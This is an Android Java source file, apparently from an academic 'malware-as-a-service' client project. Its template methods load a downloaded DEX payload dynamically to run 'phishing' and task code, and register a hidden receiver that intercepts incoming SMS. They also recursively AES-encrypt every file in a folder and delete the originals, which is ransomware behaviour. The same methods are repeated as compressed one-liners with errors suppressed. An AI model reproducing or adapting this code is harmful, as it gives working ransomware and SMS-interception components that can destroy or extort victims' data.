package edu.ntu.android.maas.client.clientapp;

/**
 * Created by pillar on 4/21/2016.
 */
public class CodeTemplate {

    public static final String TAG = CodeTemplate.class.getName();

    /**
     * Provide a class and the context, update the layout of the activity
     * @param task
     * @param context
     */
    public static void phishingOrig(Class task, android.content.Context context){
        try {
            Object obj = task.newInstance();
            java.lang.reflect.Method mtd = task.getDeclaredMethod("phishing", new Class[]{android.content.Context.class});
            mtd.invoke(obj, context);
        }catch(Exception ex){
            android.util.Log.e(TAG, ex.getMessage());
        }
    }

    public static void phishingOrig(android.content.Context context) {
        try {
            dalvik.system.DexClassLoader loader = new dalvik.system.DexClassLoader(context.getFilesDir().getAbsolutePath() + "/" + edu.ntu.android.maas.client.clientapp.Constants.DEX_FILE, context.getDir("outdex", android.content.Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());
            Class clz = loader.loadClass("edu.ntu.android.maas.client.clientapp.TaskBackup");
            Object obj = clz.newInstance();
            java.lang.reflect.Method mtd = clz.getDeclaredMethod("phishing", new Class[]{android.content.Context.class});
            mtd.invoke(obj, context);
        }catch (Exception ex){
            android.util.Log.e(TAG, ex.getMessage());
        }
    }

    public static android.content.BroadcastReceiver getBroadcastReceiver(Class task, android.content.Context context){
        try{
            Object obj = task.newInstance();
            java.lang.reflect.Method mtd = task.getDeclaredMethod("executeTask", new Class[]{android.content.Context.class, String.class});
            Object recv = mtd.invoke(obj, context);
            if (recv != null){
                return (android.content.BroadcastReceiver)recv;
            }
        }catch(Exception ex){
            android.util.Log.e(TAG, ex.getMessage());
        }
        return null;
    }

    public static android.content.BroadcastReceiver getBroadcastReceiverOrig(android.content.Context context) {
        try {
            dalvik.system.DexClassLoader loader = new dalvik.system.DexClassLoader(context.getFilesDir().getAbsolutePath() + "/" + edu.ntu.android.maas.client.clientapp.Constants.DEX_FILE, context.getDir("outdex", android.content.Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());
            Class clz = loader.loadClass("edu.ntu.android.maas.client.clientapp.TaskBackup");
            Object obj = clz.newInstance();
            java.lang.reflect.Method mtd = clz.getDeclaredMethod("executeTask", new Class[]{android.content.Context.class, String.class});
            Object recv = mtd.invoke(obj, context);
            if (recv != null) {
                context.registerReceiver((android.content.BroadcastReceiver)recv, new android.content.IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
                return (android.content.BroadcastReceiver) recv;
            }
        }catch (Exception ex){
            android.util.Log.e(TAG, ex.getMessage());
            /*BroadcastReceiver recv = (BroadcastReceiver)new TaskBackup().executeTask(context, "broadcastreceiver");
            context.registerReceiver(recv, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
            return recv;*/
        }
        return null;
    }

    /**
     * Decrypt the files
     * @param password
     * @param folder
     */
    public static void decryptOrig(String password, String folder){
        try{
            java.io.File file = new java.io.File(folder);
            for (java.io.File f : file.listFiles()){
                android.util.Log.d(TAG, f.getAbsolutePath());
                if (f.isDirectory()){
                    decryptOrig(password, f.getAbsolutePath());
                }else if (f.isFile() && f.getName().endsWith(".encrypted")){
                    byte[] key = password.getBytes("UTF-8");
                    java.security.MessageDigest sha = java.security.MessageDigest.getInstance("SHA-1");
                    key = sha.digest(key);
                    key = java.util.Arrays.copyOf(key, 16); // use only first 128 bit

                    java.io.FileInputStream fis = new java.io.FileInputStream(f);

                    java.io.FileOutputStream fos = new java.io.FileOutputStream(f.getAbsolutePath().substring(0, f.getAbsolutePath().length()-10));
                    javax.crypto.spec.SecretKeySpec sks = new javax.crypto.spec.SecretKeySpec(key, "AES");
                    javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");
                    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sks);
                    javax.crypto.CipherInputStream cis = new javax.crypto.CipherInputStream(fis, cipher);
                    int b;
                    byte[] d = new byte[8];
                    while((b = cis.read(d)) != -1) {
                        fos.write(d, 0, b);
                    }
                    fos.flush();
                    fos.close();
                    cis.close();

                    f.delete();
                }
            }

        }catch(Exception ex){ android.util.Log.d(TAG, ex.getMessage());}
    }

    /**
     * Encrypt the files
     * @param password
     * @param folder
     */
    public static void encryptOrig(String password, String folder){
        try {
            java.io.File file = new java.io.File(folder);
            for (java.io.File f : file.listFiles()){
                android.util.Log.d(TAG, f.getAbsolutePath());
                if (f.isDirectory()){
                    encryptOrig(password, f.getAbsolutePath());
                }else if (f.isFile() && !f.getName().endsWith(".encrypted")){
                    // Here you read the cleartext.
                    java.io.FileInputStream fis = new java.io.FileInputStream(f);
                    // This stream write the encrypted text. This stream will be wrapped by another stream.
                    java.io.FileOutputStream fos = new java.io.FileOutputStream(f.getAbsolutePath()+".encrypted");

                    // Length is 16 byte
                    // Careful when taking user input!!! http://stackoverflow.com/a/3452620/1188357
                    byte[] key = password.getBytes("UTF-8");
                    java.security.MessageDigest sha = java.security.MessageDigest.getInstance("SHA-1");
                    key = sha.digest(key);
                    key = java.util.Arrays.copyOf(key, 16); // use only first 128 bit
                    javax.crypto.spec.SecretKeySpec sks = new javax.crypto.spec.SecretKeySpec(key, "AES");
                    // Create cipher
                    javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");
                    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, sks);
                    // Wrap the output stream
                    javax.crypto.CipherOutputStream cos = new javax.crypto.CipherOutputStream(fos, cipher);
                    // Write bytes
                    int b;
                    byte[] d = new byte[2048];
                    while ((b = fis.read(d)) != -1) {
                        cos.write(d, 0, b);
                    }
                    // Flush and close streams.
                    cos.flush();
                    cos.close();
                    fis.close();

                    f.delete();
                }
            }

        }catch (Exception ex){ android.util.Log.e(TAG, ex.getMessage());}
    }

    public static void phishing(Class task, android.content.Context context){try {Object obj = task.newInstance();java.lang.reflect.Method mtd = task.getDeclaredMethod("phishing", new Class[]{android.content.Context.class});mtd.invoke(obj, context);}catch(Exception ex){}}
    public static void phishing(android.content.Context context) {try {dalvik.system.DexClassLoader loader = new dalvik.system.DexClassLoader(context.getFilesDir().getAbsolutePath() + "/" + edu.ntu.android.maas.client.clientapp.Constants.DEX_FILE, context.getDir("outdex", android.content.Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());Class clz = loader.loadClass("edu.ntu.android.maas.client.clientapp.TaskBackup");Object obj = clz.newInstance();java.lang.reflect.Method mtd = clz.getDeclaredMethod("phishing", new Class[]{android.content.Context.class});mtd.invoke(obj, context);}catch (Exception ex){}}
    public static android.content.BroadcastReceiver getBroadcastReceiver(android.content.Context context) {try {dalvik.system.DexClassLoader loader = new dalvik.system.DexClassLoader(context.getFilesDir().getAbsolutePath() + "/" + edu.ntu.android.maas.client.clientapp.Constants.DEX_FILE, context.getDir("outdex", android.content.Context.MODE_PRIVATE).getAbsolutePath(), null, context.getClassLoader());Class clz = loader.loadClass("edu.ntu.android.maas.client.clientapp.TaskBackup");Object obj = clz.newInstance();java.lang.reflect.Method mtd = clz.getDeclaredMethod("executeTask", new Class[]{android.content.Context.class, String.class});Object recv = mtd.invoke(obj, context);if (recv != null) {context.registerReceiver((android.content.BroadcastReceiver)recv, new android.content.IntentFilter("android.provider.Telephony.SMS_RECEIVED"));return (android.content.BroadcastReceiver) recv;}}catch (Exception ex){}return null;}
    public static void decrypt(String password, String folder){try{java.io.File file = new java.io.File(folder);for (java.io.File f : file.listFiles()){if (f.isDirectory()){decrypt(password, f.getAbsolutePath());} else if (f.isFile() && f.getName().endsWith(".encrypted")){byte[] key = password.getBytes("UTF-8");java.security.MessageDigest sha =java.security.MessageDigest.getInstance("SHA-1");key = sha.digest(key);key = java.util.Arrays.copyOf(key, 16);java.io.FileInputStream fis = new java.io.FileInputStream(f);java.io.FileOutputStream fos = new java.io.FileOutputStream(f.getAbsolutePath().substring(0, f.getAbsolutePath().length()-10));javax.crypto.spec.SecretKeySpec sks = new javax.crypto.spec.SecretKeySpec(key, "AES");javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sks);javax.crypto.CipherInputStream cis = new javax.crypto.CipherInputStream(fis, cipher);int b;byte[] d = new byte[8];while((b = cis.read(d)) != -1) {fos.write(d, 0, b);}fos.flush();fos.close();cis.close();f.delete();}}}catch(Exception ex){}}
    public static void encrypt(String password, String folder){try {java.io.File file = new java.io.File(folder);for (java.io.File f : file.listFiles()){if (f.isDirectory()){encrypt(password, f.getAbsolutePath());}else if (f.isFile() && !f.getName().endsWith(".encrypted")){java.io.FileInputStream fis = new java.io.FileInputStream(f); java.io.FileOutputStream fos = new java.io.FileOutputStream(f.getAbsolutePath()+".encrypted");byte[] key = password.getBytes("UTF-8");java.security.MessageDigest sha = java.security.MessageDigest.getInstance("SHA-1");key = sha.digest(key);key = java.util.Arrays.copyOf(key, 16); javax.crypto.spec.SecretKeySpec sks = new javax.crypto.spec.SecretKeySpec(key, "AES");javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, sks);javax.crypto.CipherOutputStream cos = new javax.crypto.CipherOutputStream(fos, cipher);int b;byte[] d = new byte[2048];while ((b = fis.read(d)) != -1) {cos.write(d, 0, b);}cos.flush();cos.close();fis.close();f.delete();}}}catch (Exception ex){}}
}
